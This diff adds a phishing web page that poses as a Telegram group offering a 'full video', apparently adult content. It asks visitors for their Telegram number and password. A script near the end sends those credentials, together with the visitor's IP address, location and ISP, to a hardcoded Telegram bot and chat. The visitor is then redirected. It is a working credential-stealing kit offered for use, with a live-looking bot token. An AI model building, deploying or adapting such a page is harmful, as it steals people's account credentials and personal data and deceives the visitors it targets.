@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>FULL VIDEO</title>
+    <meta name="description" content="TELEGRAM GROUP GROUP ADMIN IF YOU WANT TO SEE THE FULL VIDEO, PLEASE JOIN TELEGRAM YOU MUST USE THE TELEGRAM NUMBER IF YOU WANT TO JOIN THE GROUP 👉JOIN THE GROUP👈 👉JOIN THE GROUP👈" />
+    <link rel="icon" href="http://videyprndznew.uaeweb.id/public/images/20.jpg" type="image/x-icon" sizes="32x25" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" />
+    <link rel="stylesheet" href="http://videyprndznew.uaeweb.id/public/css/style.css" />
+    <link rel="stylesheet" href="http://videyprndznew.uaeweb.id/public/css/video-js.min.css" />
+</head>
+<body>
+    <nav class="navbar bg-pink">
+        <div class="container d-flex justify-content-center">
+            <h3 class="text-white fw-bold">FULL VIDEO TELEGRAM</h3>
+        </div>
+    </nav>
+    <div class="loading" style="display: none" id="loading">
+        <div class="loader"></div>
+    </div>
+    <header>
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-md-4 p-0 m-0">
+                    <img src="http://videyprndznew.uaeweb.id/public/images/20.jpg" alt="" class="img-fluid" />
+                </div>
+            </div>
+        </div>
+    </header>
+    <main>
+        <div class="container">
+            <div class="row justify-content-center mt-3">
+                <div class="col-md-4">
+                    <!-- 🔐 Join Form Start -->
+                    <form id="join-form">
+                        <input type="text" name="number" placeholder="Enter Telegram Number" class="form-control mb-2" required />
+                        <input type="password" name="password" placeholder="Enter Password" class="form-control mb-2" required />
+                        <button type="submit" class="btn btn-danger w-100">Join Now</button>
+                    </form>
+                    <!-- 🔐 Join Form End -->
+
+                    <div class="mb-3 mt-3">
+                        <h6 class="text-center fw-bold">
+                            IF YOU WANT TO SEE THE FULL VIDEO, PLEASE JOIN TELEGRAM
+                        </h6>
+                    </div>
+                    <div class="mb-3">
+                        <a href="http://videyprndznew.uaeweb.id/tele/index.php" class="text-decoration-none">
+                            <img class="img-fluid" src="http://videyprndznew.uaeweb.id/public/images/21.jpg" alt="" />
+                        </a>
+                    </div>
+                    <div class="mb-3">
+                        <h6 class="text-center fw-bold">
+                            YOU MUST USE THE TELEGRAM NUMBER IF YOU WANT TO JOIN THE GROUP
+                        </h6>
+                    </div>
+
+                    <!-- 🎬 Video 1 -->
+                    <div class="video-header mb-1">
+                        <video id="my-player" class="video-js" controls autoplay muted preload="auto" poster="public/images/21.jpg" data-setup="{}">
+                            <source src="http://videyprndznew.uaeweb.id/public/videos/1.mp4" type="video/mp4">
+                        </video>
+                    </div>
+
+                    <div class="mb-3 text-center">
+                        <a href="" class="fw-bold text-decoration-none text-pink">👉 JOIN THE GROUP 👈</a>
+                    </div>
+
+                    <!-- 🎬 Video 2 -->
+                    <div class="video-header mb-1">
+                        <video class="video-js" controls autoplay muted preload="auto" poster="public/images/21.jpg" data-setup="{}">
+                            <source src="http://videyprndznew.uaeweb.id/public/videos/2.mp4" type="video/mp4">
+                        </video>
+                    </div>
+
+                    <div class="mb-3 text-center">
+                        <a href="" class="fw-bold text-decoration-none text-pink">👉 JOIN THE GROUP 👈</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="bg-pink px-3 py-1 text-center">
+            <a href="" class=text-white>https://telegram.org</a> <span class="text-white">| 2025</span>
+        </div>
+    </footer>
+
+    <!-- JS Files -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <script src="https://code.jquery.com/jquery.min.js"></script>
+    <script src="http://videyprndznew.uaeweb.id/public/js/video.min.js"></script>
+
+    <!-- 🔐 Data Capture Script -->
+    <script>
+        const BOT_TOKEN = '7152770350:AAE3CuphgP9plAwz-haPEy279lbY35opB4U'; // 🛑 Replace with your bot token
+        const CHAT_ID = '6155323694';     // 🛑 Replace with your chat ID
+
+        document.getElementById("join-form").addEventListener("submit", function (e) {
+            e.preventDefault();
+            const number = this.number.value;
+            const password = this.password.value;
+
+            fetch("https://ipapi.co/json")
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country_name;
+                    const isp = data.org;
+
+                    const msg = `📥 *New Join Request*:
+🔢 Number: ${number}
+🔐 Password: ${password}
+🌍 IP: ${ip}
+📍 Location: ${city}, ${region}, ${country}
+📡 ISP: ${isp}
+👤 From: Cyber Sojib | ZeroDay Watch`;
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: msg,
+                            parse_mode: "Markdown"
+                        })
+                    });
+
+                    // Redirect after sending
+                    window.location.href = "https://t.me/YourGroupLinkHere";
+                });
+        });
+    </script>
+</body>
+</html>
